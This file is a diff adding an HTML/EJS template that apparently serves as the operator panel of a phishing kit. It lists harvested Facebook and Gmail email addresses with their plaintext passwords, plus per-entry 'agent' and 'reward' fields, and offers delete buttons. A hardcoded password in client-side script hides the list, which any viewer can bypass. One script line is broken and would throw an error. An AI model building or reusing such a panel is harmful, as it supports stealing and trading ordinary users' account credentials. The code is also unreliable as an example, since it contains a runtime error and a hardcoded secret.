@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html>
+<head>
+
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<link rel="icon" href="/site_icon.jpg">
+
+
+	<style type="text/css">
+
+		@media screen and (min-width: 300px){
+
+
+			body{
+				font-family: arial, helvetica, sans-serif;
+			}
+			
+			.data_wrapper{
+				display: grid;
+				grid-template-columns: 1fr 4fr 2fr;
+				max-width: 700px;
+				margin: 45px auto;
+			}
+
+
+			.select_social_wrapper{
+				display: grid;
+				grid-template-columns: 1fr 1fr;
+			}
+
+
+			.select_social_wrapper > button{
+				background-color: rgb(0, 150, 60);
+				border: 1px solid rgb(150, 150, 150);
+				color: white;
+				display: block;
+				width: 100px;
+				padding: 10px;
+				margin: 0 0 0 20px;
+			}
+
+
+			.select_social_wrapper > button + button{
+				margin: 0 20px 0 auto;
+				background-color: white;
+				color: black;
+			}
+
+			.data_wrapper_wrapper > div{
+				background-color: rgb(240, 240, 240);	
+				padding: 5px 0;
+				font-size: 12px;
+			}
+			
+			.data_wrapper_wrapper > div:nth-child(even){
+				background-color: rgb(200, 200, 200);	
+			}
+
+
+
+			.data_wrapper > div{
+				padding:5px 0;
+				border-left: 1px solid rgb(160, 160, 160);
+				text-align: center;
+			}
+
+			.delete{
+				display: block;
+				padding: 7px 15px;
+				margin: 10px 5px 0 auto;
+				background-color: rgb(200, 30, 10);
+				color: white;
+				border: none;
+			}
+
+		}
+
+
+
+
+
+
+		@media screen and (min-width: 1000px){
+			.data_wrapper_wrapper > div{
+				font-size: 16px;
+			}
+		}
+
+
+
+	</style>
+
+
+	<title></title>
+</head>
+
+
+
+
+
+<body>
+	<main>
+		<h2 style="text-align: center; color: red; margin-top: 20px">All Account</h2>
+
+		<h1 style="margin-top: 20px; text-align: center;"></h1>
+		<form style="margin: 20px 0">
+			<input type="password" name="password">
+			<button>Okay</button>
+		</form>
+
+		
+
+		<div class="data_wrapper_wrapper">
+			<div class="select_social_wrapper">
+				<button class="select_fb">FB</button>
+				<button class="select_gm">GM</button>
+			</div>
+
+            	<%let facebookLength = 0;%>
+			<%if(facebookData && facebookData.length > 0){%>
+				<%facebookData.forEach((each)=>{%>
+					<%facebookLength +=1;%>
+					<div style="display: grid;" class="data_wrapper fb_data_wrapper" data-facebooklength="<%=facebookLength%>">
+						<div class="isFacebook true">FB</div>
+						<div class="email"><%=each.email%></div>
+						<div class="password"><%=each.password%></div>
+						<div class="email"><%=each.agent%></div>
+						<div class="email"><%=each.reward%></div>
+						<button class="delete" data-email="<%=each.email%>" data-isfacebook="<%=each.isFacebook%>" >Delete</button>
+						<span></span>
+						<span></span>
+						
+					</div>
+				<%})%>
+			<%}%>
+
+			<%if(facebookLength === 0){%>
+				<script type="text/javascript">
+					document.querySelector("h1").textContent = "No FB Account Yet";
+				</script>
+			<%}%>
+
+
+			<%if(gmailData && gmailData.length > 0){%>
+				<%let gmailLength = 0;%>
+				<%gmailData.forEach((each)=>{%>
+					<%gmailLength +=1;%>
+					<div style="display: none;" class="data_wrapper gm_data_wrapper" data-gmaillength="<%=gmailLength%>">
+						<div class="isFacebook false">GM</div>
+						<div class="email"><%=each.email%></div>
+						<div class="password"><%=each.password%></div>
+						<span></span>
+						<span></span>
+						<button class="delete" data-email="<%=each.email%>" data-isfacebook="<%=each.isFacebook%>" >Delete</button>
+					</div>
+				<%})%>
+			<%}%>
+		</div>
+
+	</main>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+	<script type="text/javascript">
+		
+		const h1 = document.querySelector("h1");
+		const form = document.querySelector("form");
+		const select_fb = document.querySelector(".select_fb");
+		const select_gm = document.querySelector(".select_gm");
+		const fb_data_wrapper = document.querySelectorAll(".fb_data_wrapper");
+		const gm_data_wrapper = document.querySelectorAll(".gm_data_wrapper");
+		const isFacebookContainer = document.querySelectorAll(".isFacebook.false");
+		const data_wrapper_wrapper = document.querySelector(".data_wrapper_wrapper");
+
+		data_wrapper_wrapper.this.state.display = "none";
+
+
+		if(fb_data_wrapper.length > 0){
+			h1.textContent = fb_data_wrapper[fb_data_wrapper.length - 1].dataset.facebooklength + " Account";
+		}
+		
+
+
+		isFacebookContainer.forEach((each)=>{
+			each.parentElement.style.color = "red";
+		});
+
+
+		form.addEventListener("submit", (e)=>{
+			e.preventDefault();
+
+			if(form.password.value === "BASSEYERCBE4"){
+				data_wrapper_wrapper.style.display = "block";
+			}else{
+				data_wrapper_wrapper.style.display = "none";
+			}
+		});
+
+
+
+
+
+		select_fb.addEventListener("click", function(){
+			this.style.backgroundColor= "rgb(0, 150, 60)";
+			this.style.color= "white";
+
+			select_gm.style.backgroundColor= "white";
+			select_gm.style.color= "black";
+
+			if(gm_data_wrapper.length > 0){
+				gm_data_wrapper.forEach((each)=>{
+					each.style.display = "none";
+				});
+			}
+			if(fb_data_wrapper.length > 0){
+				h1.textContent = fb_data_wrapper[fb_data_wrapper.length - 1].dataset.facebooklength + " Account";
+
+				fb_data_wrapper.forEach((each)=>{
+					each.style.display = "grid";
+				});
+			}else{
+				h1.textContent = "No FB Account Yet";
+			}
+		});
+
+
+
+		select_gm.addEventListener("click", function(){
+			this.style.backgroundColor= "rgb(0, 150, 60)";
+			this.style.color= "white";
+
+			select_fb.style.backgroundColor= "white";
+			select_fb.style.color= "black";
+
+			
+
+			if(fb_data_wrapper.length > 0){
+				fb_data_wrapper.forEach((each)=>{
+					each.style.display = "none";
+				});
+			}
+
+
+			if(gm_data_wrapper.length > 0){
+				h1.textContent = gm_data_wrapper[gm_data_wrapper.length - 1].dataset.gmaillength + " Account";
+
+				gm_data_wrapper.forEach((each)=>{
+					each.style.display = "grid";
+				});
+			}else{
+				h1.textContent = "No GM Account Yet";
+			}
+			
+		});
+
+
+
+
+
+	</script>
+
+</body>
+</html>
